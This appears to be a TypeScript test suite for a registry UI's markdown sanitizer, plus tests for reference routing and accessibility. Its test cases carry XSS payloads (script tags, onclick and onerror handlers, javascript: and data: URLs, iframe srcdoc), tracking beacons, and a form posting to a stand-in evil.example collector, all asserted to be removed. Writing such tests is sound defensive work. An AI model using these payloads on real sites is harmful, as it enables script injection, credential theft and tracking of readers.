// The sanitizer case set. One case per admitting clause of the sanitization
// rule: no executable node survives, no event-handler attribute survives, the
// allowlist admits no URL scheme other than http, https, and mailto, the
// sanitizer takes the rendered output as its input, and frontmatter never
// reaches this path.
//
// Every payload except the last is delivered as an artifact body and renders
// through the sanitized rendering path. What the sanitizer leaves in place of
// a removed node, attribute, or URL is this implementation's choice, so each
// case asserts the absence its clause states rather than a replacement.

import { fireEvent, render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { ArtifactBody } from './components/ArtifactBody';
import { PropertyTable } from './components/PropertyTable';

function renderBody(body: string, resources: readonly string[] = []): HTMLElement {
  return render(<ArtifactBody body={body} resources={resources} />).container;
}

/** attributeValues returns every attribute value on every element rendered,
 * so a case can assert that a scheme survives on no attribute rather than on
 * one it names. */
function attributeValues(container: HTMLElement): string[] {
  const values: string[] = [];
  for (const element of container.querySelectorAll('*')) {
    for (const attribute of element.attributes) {
      values.push(attribute.value);
    }
  }
  return values;
}

describe('the sanitized artifact-body rendering path', () => {
  it('renders a well-formed body as a document', () => {
    const container = renderBody('# Title\n\nA [link](https://example.com/a) and `code`.\n');
    expect(container.querySelector('h1')?.textContent).toBe('Title');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a');
    expect(container.querySelector('code')?.textContent).toBe('code');
  });

  it('keeps no executable node', () => {
    const container = renderBody('Before\n\n<script>window.hijacked = true;</script>\n\nAfter\n');
    expect(container.querySelector('script')).toBeNull();
    expect(container.textContent).toContain('Before');
  });

  it('keeps no event-handler attribute', () => {
    const container = renderBody('<p onclick="window.hijacked = true;">Text</p>\n');
    expect(container.querySelector('[onclick]')).toBeNull();
    expect(container.textContent).toContain('Text');
  });

  it('keeps no javascript: URL', () => {
    const container = renderBody('<a href="javascript:window.hijacked=1">Go</a>\n');
    expect(attributeValues(container).some((value) => value.toLowerCase().includes('javascript:'))).toBe(false);
  });

  // The rule ranges over every attribute the sanitizer keeps rather than
  // over links alone, so the payload is delivered on a link, on a markdown
  // image, and on a media element. A sanitizer configured with a URI
  // allowlist and nothing else keeps the last two, because a data: URL on a
  // media element's source attribute is admitted by a branch that does not
  // consult the allowlist.
  it('keeps no data: URL on a link, on an image, or on a media element', () => {
    const bodies = [
      '<a href="data:text/html,<b>x</b>">Go</a>\n',
      '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n',
      '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="x">\n',
      '<video src="data:text/html,x"></video>\n',
      // A candidate list carries several URLs, and the offending one need not
      // lead. A test that reads the whole value passes on the leading
      // relative candidate and keeps every later candidate verbatim.
      '<img src="/ok.png" srcset="/ok.png 1x, data:text/html;base64,PHN2Zz48L3N2Zz4= 2x" alt="x">\n',
    ];
    for (const body of bodies) {
      const container = renderBody(body);
      expect(attributeValues(container).some((value) => value.toLowerCase().includes('data:'))).toBe(false);
    }
  });

  // The rule ranges over every scheme rather than over the ones an exploit
  // is usually written in, and RFC 3986 lets a scheme carry a digit after
  // its first character. An allowlist that recognizes a relative URL by
  // spelling out the characters a scheme cannot hold admits a digit-bearing
  // scheme as if it carried none, so the case drives one that is registered,
  // one that is not, and one whose payload is a link.
  it('keeps no URL whose scheme carries a digit', () => {
    const schemes = ['s3://bucket/key', 'h323:alice@acme.com', 'a1:window.hijacked=1'];
    for (const url of schemes) {
      const container = renderBody(`<a href="${url}">Go</a>\n\n[Go](${url})\n`);
      expect(attributeValues(container).some((value) => value.includes(url.split(':')[0] + ':'))).toBe(false);
    }
  });

  // A relative URL carries no scheme, and the allowlist admits it. The
  // forms a manifest's own links take are a path, a bare filename, a query,
  // and a fragment, and a value whose leading run cannot open a scheme. The
  // clause is that the anchor keeps a destination; where that destination is
  // a cross-artifact prose reference, the routing pass rewrites it to this
  // UI's own route, so the clause is asserted as a destination that survived
  // rather than as the authored value.
  it('keeps a relative URL', () => {
    const relative = ['/docs/a.md', 'sibling.md', './nested/b.md', '?version=2', '#section', '1abc:not-a-scheme'];
    for (const url of relative) {
      const anchor = renderBody(`[Go](${url})\n`).querySelector('a');
      expect(anchor?.getAttribute('href')).not.toBe(null);
      expect(anchor?.classList.contains('link-stripped')).toBe(false);
    }
  });

  // The sanitizer takes the rendered output as its input. The payload here
  // spells no HTML: it is markdown link syntax, which the renderer emits as
  // an anchor carrying the author's URL. A sanitizer wired to the markdown
  // source finds nothing to remove in it and passes every other case in this
  // file, so this is the case that discriminates the two wirings.
  it('sanitizes what the renderer emitted rather than the markdown source', () => {
    const container = renderBody('[Go](javascript:window.hijacked=1)\n');
    expect(attributeValues(container).some((value) => value.toLowerCase().includes('javascript:'))).toBe(false);
  });

  // A form on the registry's origin is indistinguishable from the UI's own
  // chrome, and the origin is the one the session cookie is scoped to, so an
  // author who can write a layer's source could otherwise prompt a reader for
  // a credential and post it to a host of the author's choosing. No markdown
  // renderer emits a form control, so the whole set is dropped.
  it('keeps no form control', () => {
    const container = renderBody(
      'Before\n\n<form action="https://evil.example/collect"><input name="q"><button>go</button></form>\n\nAfter\n',
    );
    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option']) {
      expect(container.querySelector(tag)).toBeNull();
    }
    expect(container.textContent).toContain('Before');
  });

  // A control's own text is a label the author wrote for it, so a control
  // that lost its element and kept its text would put that label in the body
  // as prose the reader cannot tell from the author's own. The control goes
  // with its subtree, and the note left in its place names the removal in the
  // terms the stripped link, image, and embed use.
  it('leaves a form control no text and a note in its place', () => {
    const container = renderBody(
      'Before\n\n<form action="/evil"><input name="q"><button>press me</button>' +
        '<select><option>choose me</option></select></form>\n\nAfter\n',
    );
    expect(container.textContent).not.toContain('press me');
    expect(container.textContent).not.toContain('choose me');
    expect(container.querySelectorAll('.form-stripped')).toHaveLength(1);
    expect(container.textContent).toContain('Before');
    expect(container.textContent).toContain('After');
  });

  // The routing pass below the form pass builds this UI's own button for a
  // bundled-file reference. A form pass that ran after it would remove that
  // button as if the author had written it, which would leave the reference
  // as a note reading (form removed).
  it('keeps the resource reference control the routing pass builds', () => {
    const container = renderBody('See [the sheet](notes.md).\n', ['notes.md']);
    expect(container.querySelector('button.resource-reference')?.textContent).toBe('the sheet');
    expect(container.querySelector('.form-stripped')).toBeNull();
  });

  // A URL the browser fetches without the reader acting reaches the host it
  // names with the reader's IP address, User-Agent, and Referer, so a body
  // that named a foreign host on one would make every view of the artifact a
  // report to its author. The payload is delivered on a markdown image, on a
  // src attribute, on a candidate list, and in the scheme-relative form that
  // names a host without spelling a scheme.
  it('keeps no fetching attribute that names a foreign host', () => {
    const bodies = [
      '![b](https://tracker.example.com/beacon.gif?viewer=1)\n',
      '<img src="https://tracker.example.com/beacon.gif?viewer=1" alt="b">\n',
      '<img srcset="https://tracker.example.com/a.png 1x" alt="s">\n',
      '<img src="/ok.png" srcset="/ok.png 1x, https://tracker.example.com/a.png 2x" alt="s">\n',
      '<img src="//tracker.example.com/beacon.gif" alt="b">\n',
      '<video poster="https://tracker.example.com/poster.png"></video>\n',
    ];
    for (const body of bodies) {
      const container = renderBody(body);
      expect(attributeValues(container).some((value) => value.includes('tracker.example.com'))).toBe(false);
    }
  });

  // A fetching attribute that resolves against this origin is the dangerous
  // case rather than the safe one. The registry serves its API on the origin
  // the UI is served from, so a body that names an API path on one makes
  // every reader's browser issue an author-chosen credentialed request
  // against the API. A relative source with no path at all resolves against
  // the UI mount and reaches the binary just the same. Neither survives.
  it('keeps no fetching attribute that resolves against this origin', () => {
    const bodies = [
      '![probe](/v1/catalog?authorprobe=1)\n',
      '<img src="/v1/catalog?authorprobe=1" alt="probe">\n',
      '<img src="x" alt="probe">\n',
      '<img srcset="/v1/catalog?authorprobe=1 1x" alt="probe">\n',
      '<img src="/assets/x.png" alt="probe">\n',
      '<video poster="/v1/catalog?authorprobe=1"></video>\n',
    ];
    for (const body of bodies) {
      const container = renderBody(body);
      expect(attributeValues(container).some((value) => value.includes('authorprobe'))).toBe(false);
      expect(container.querySelector('[src], [srcset], [poster]')).toBeNull();
    }
  });

  // A link is followed by the reader rather than by the browser, so it keeps
  // its host, and a relative link keeps its destination.
  it('keeps a link to a foreign host and a link on this origin', () => {
    const container = renderBody('[Go](https://example.com/a)\n\n[Here](/ui/#/layers)\n');
    const hrefs = Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(['https://example.com/a', '/ui/#/layers']);
  });

  // An anchor whose destination the allowlist refused keeps its element and
  // its text. Without a marker it draws in the link colour and invites a
  // click that goes nowhere, so the rendering path marks it and the
  // stylesheet drops it to body text with the removal named beside it. The
  // class is stripped from every node first, so a body that writes the marker
  // on a live link of its own cannot pass that link off as a neutralized one.
  it('marks an anchor whose destination it removed', () => {
    const stripped = [
      '<a href="javascript:window.hijacked=1">click me</a>\n',
      '<a href="&#106;avascript:window.hijacked=1">click me</a>\n',
      '<a href=" javascript:window.hijacked=1">click me</a>\n',
    ];
    for (const body of stripped) {
      const anchor = renderBody(body).querySelector('a');
      expect(anchor?.classList.contains('link-stripped')).toBe(true);
      expect(anchor?.textContent).toBe('click me');
    }

    const live = renderBody('<a class="link-stripped" href="https://example.com/a">Go</a>\n').querySelector('a');
    expect(live?.getAttribute('href')).toBe('https://example.com/a');
    expect(live?.classList.contains('link-stripped')).toBe(false);
  });

  // An image whose source the rendering path removed has nothing left to
  // draw, and the element on its own draws the browser's broken-image
  // placeholder. The path replaces it with a note carrying its alt text,
  // which the stylesheet names the removal beside. The marker is stripped
  // from every node the body writes it on, so a body cannot pass an element
  // of its own off as a neutralized one.
  it('replaces an image whose source it removed with a note', () => {
    const stripped = [
      '<img src="https://example.com/track.gif?u=1" alt="a beacon" width="10">\n',
      '<img srcset="https://example.com/track.gif?u=1 1x" alt="a beacon">\n',
      '<img src="/v1/catalog?authorprobe=1" alt="a beacon">\n',
      '<img src="x" alt="a beacon">\n',
    ];
    for (const body of stripped) {
      const container = renderBody(body);
      expect(container.querySelector('img')).toBeNull();
      const note = container.querySelector('.image-stripped');
      expect(note?.textContent).toBe('a beacon');
    }

    const live = renderBody('<p class="image-stripped">local</p>\n');
    expect(live.querySelector('p')?.textContent).toBe('local');
    expect(live.querySelector('.image-stripped')).toBeNull();
  });

  // An embedded document draws nothing at all once the rendering path has
  // refused its source, so the paragraph the author wrote it in disappears
  // and the reader cannot tell a refusal from a body that failed to ingest.
  // The path replaces it with a note, which the stylesheet names the removal
  // beside, in the same terms it names the stripped link and the stripped
  // image. The marker is stripped from every node the body writes it on, so a
  // body cannot pass an element of its own off as a neutralized one.
  it('replaces an embedded document it removed with a note', () => {
    const stripped = [
      '<iframe src="https://example.com/frame" title="a frame"></iframe>\n',
      '<iframe srcdoc="&lt;script&gt;window.hijacked=1&lt;/script&gt;" title="a frame"></iframe>\n',
      '<embed src="https://example.com/frame" title="a frame">\n',
    ];
    for (const body of stripped) {
      const container = renderBody(body);
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.querySelector('embed')).toBeNull();
      expect(container.querySelector('[srcdoc]')).toBeNull();
      const note = container.querySelector('.embed-stripped');
      expect(note?.textContent).toBe('a frame');
    }

    const live = renderBody('<p class="embed-stripped">local</p>\n');
    expect(live.querySelector('p')?.textContent).toBe('local');
    expect(live.querySelector('.embed-stripped')).toBeNull();
  });

  // A drawing the sanitizer's HTML profile refuses leaves the paragraph the
  // author wrote it in empty, which reads as a body that lost a passage
  // rather than as a refusal. The path replaces it with a note, which the
  // stylesheet names the removal beside, in the same terms it names the
  // stripped link, image, embed, and form. The subtree goes with it, so no
  // text of a refused element lands in the body as prose. The marker is
  // stripped from every node the body writes it on, so a body cannot pass an
  // element of its own off as a neutralized one.
  it('replaces a drawing it removed with a note', () => {
    const container = renderBody(
      'Before.\n\n<svg width="20" height="20"><title>a chart</title>' +
        '<circle cx="10" cy="10" r="9"/></svg>\n\nAfter.\n',
    );
    expect(container.querySelector('svg')).toBeNull();
    expect(container.querySelectorAll('.graphic-stripped')).toHaveLength(1);
    expect(container.textContent).not.toContain('a chart');
    expect(container.textContent).toContain('Before.');
    expect(container.textContent).toContain('After.');

    const live = renderBody('<p class="graphic-stripped">local</p>\n');
    expect(live.querySelector('p')?.textContent).toBe('local');
    expect(live.querySelector('.graphic-stripped')).toBeNull();
  });

  it('renders a markup-carrying frontmatter value as literal text', () => {
    const container = render(<PropertyTable raw={'title: <img src=x onerror="window.hijacked=1">\n'} />).container;
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror="window.hijacked=1">');
  });
});

// A §4.4 prose reference names another artifact by its canonical ID, written
// as a relative markdown link, and `lint.prose_reference` admits that form.
// Left as authored the browser resolves it against the `/ui/` mount and the
// reader leaves the SPA for the registry's plain-text 404, so the viewer
// routes it to the artifact route the relations rail builds for the same
// target (§13.10).
describe('a cross-artifact prose reference in the body', () => {
  it('routes to the artifact the reference names', () => {
    const container = renderBody('See [the base](legal/base-policy).\n');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('#/artifact/legal%2Fbase-policy');
  });

  it('routes a reference written with a leading ./ and a version pin', () => {
    const container = renderBody('See [the base](./legal/base-policy@1.2.0).\n');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('#/artifact/legal%2Fbase-policy');
  });

  it('leaves an anchor and an absolute URL as authored', () => {
    const container = renderBody('An [anchor](#section) and a [page](https://example.com/a).\n');
    const hrefs = [...container.querySelectorAll('a')].map((anchor) => anchor.getAttribute('href'));
    expect(hrefs).toEqual(['#section', 'https://example.com/a']);
  });

  it('leaves a reference that escapes the artifact package as authored', () => {
    const container = renderBody('See [outside](../elsewhere).\n');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('../elsewhere');
  });
});

// A §4.4 prose reference also names a file the artifact bundles, and
// `lint.prose_reference` admits that form too. The registry serves no
// per-artifact asset route, so left as authored the reference resolves
// against the `/ui/` mount and following it drops the reader out of the SPA
// onto a plain-text 404. The file's delivery is the viewer's Resources tab,
// so the reference is rendered as a control naming the file rather than as a
// link out of the application (§13.10).
describe('a prose reference to a bundled file', () => {
  it('renders as a control naming the file rather than as a link', () => {
    const container = renderBody('See [the checklist](files/checklist.md).\n', ['files/checklist.md']);
    expect(container.querySelector('a')).toBeNull();
    const control = container.querySelector('button');
    expect(control?.getAttribute('data-resource')).toBe('files/checklist.md');
    expect(control?.textContent).toBe('the checklist');
    expect(control?.getAttribute('type')).toBe('button');
  });

  it('resolves a reference written with a leading ./ and one carrying a fragment', () => {
    const container = renderBody('A [file](./files/notes.txt) and a [part](files/notes.txt#top).\n', [
      'files/notes.txt',
    ]);
    const named = [...container.querySelectorAll('button')].map((control) => control.getAttribute('data-resource'));
    expect(named).toEqual(['files/notes.txt', 'files/notes.txt']);
  });

  it('reports the file the reader follows', () => {
    const followed: string[] = [];
    const container = render(
      <ArtifactBody
        body={'See [the checklist](files/checklist.md).\n'}
        resources={['files/checklist.md']}
        onResource={(name) => followed.push(name)}
      />,
    ).container;
    const control = container.querySelector('button') as HTMLButtonElement;
    fireEvent.click(control);
    expect(followed).toEqual(['files/checklist.md']);
  });
});

// A table and a code fence render into a box that scrolls sideways rather
// than wrapping, and a reader with no pointer reaches the columns and the
// command text past the box's edge only when the box is in the tab order
// under a name (WCAG 2.1.1).
describe("a body's sideways-scrolling regions", () => {
  it('wraps a table in a focusable region named by its headers', () => {
    const container = renderBody('| Layer | Scope |\n| --- | --- |\n| base | org |\n');
    const region = container.querySelector('.table-scroll');
    expect(region?.getAttribute('tabindex')).toBe('0');
    expect(region?.getAttribute('role')).toBe('region');
    expect(region?.getAttribute('aria-label')).toBe('Table: Layer, Scope');
    // The table keeps its own semantics inside the region.
    expect(region?.querySelector('table')).not.toBeNull();
    expect(container.querySelector('table')?.getAttribute('role')).toBeNull();
  });

  it('makes a code fence a focusable region named by its language', () => {
    const container = renderBody('```bash\npodium serve --standalone\n```\n');
    const pre = container.querySelector('pre');
    expect(pre?.getAttribute('tabindex')).toBe('0');
    expect(pre?.getAttribute('role')).toBe('region');
    expect(pre?.getAttribute('aria-label')).toBe('bash code block');
  });

  it('names a fence that declares no language and a table that carries no header', () => {
    const fence = renderBody('```\nplain text\n```\n');
    expect(fence.querySelector('pre')?.getAttribute('aria-label')).toBe('Code block');

    const table = renderBody('<table><tr><td>cell</td></tr></table>\n');
    expect(table.querySelector('.table-scroll')?.getAttribute('aria-label')).toBe('Table');
  });
});
